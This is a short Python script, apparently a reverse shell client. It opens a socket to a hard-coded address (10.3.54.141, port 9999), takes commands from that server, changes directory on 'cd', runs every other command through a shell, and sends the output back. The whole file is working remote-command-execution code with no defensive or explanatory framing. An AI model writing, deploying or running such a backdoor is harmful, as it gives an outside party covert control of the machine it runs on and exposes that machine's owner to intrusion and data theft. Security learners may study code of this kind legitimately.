import socket
import os
import subprocess

s = socket.socket()
port = 9999
host = "10.3.54.141" # server ip 

# connect to created socket, ip not needed
s.connect((host,port))

while True:
    data = s.recv(1024) # chunks in which server will recieve
    # data checks
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")

        s.send(str.encode(output_str))

        print(output_str)
